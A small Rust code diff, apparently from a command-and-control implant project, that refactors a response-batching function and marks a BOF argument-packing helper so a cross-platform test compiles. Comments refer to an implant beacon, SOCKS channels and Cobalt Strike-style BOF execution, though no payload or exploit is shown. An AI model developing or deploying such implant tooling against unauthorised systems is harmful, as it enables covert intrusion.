@@ -251,7 +251,7 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
 /// `Response::Err` messages are themselves bounded well under `MAX_BLOB_LEN`,
 /// so the retry always succeeds. Ported from the implant beacon's
 /// `encode_batch` (crates/implant-win/src/beacon.rs).
-fn encode_batch(pending: &mut Vec<TaskResponse>) -> Vec<u8> {
+fn encode_batch(pending: &mut [TaskResponse]) -> Vec<u8> {
     if let Ok(v) = TaskResponse::encode_vec(pending) {
         return v;
     }
@@ -836,6 +836,10 @@ fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
 /// implant-win's `pack_args`; the empty slice packs to an empty blob (the
 /// bof-runner passes a NULL buffer + 0 for no-args BOFs per the CS ABI
 /// `void go(char *args, int alen)`).
+// Only reachable from the windows cfg-block of `bof_execute`, but kept
+// compiled on all platforms so the host-side wire-format test runs in
+// macOS/Linux CI.
+#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
 fn pack_bof_args(args: &[String]) -> Vec<u8> {
     let mut out = Vec::new();
     for a in args {
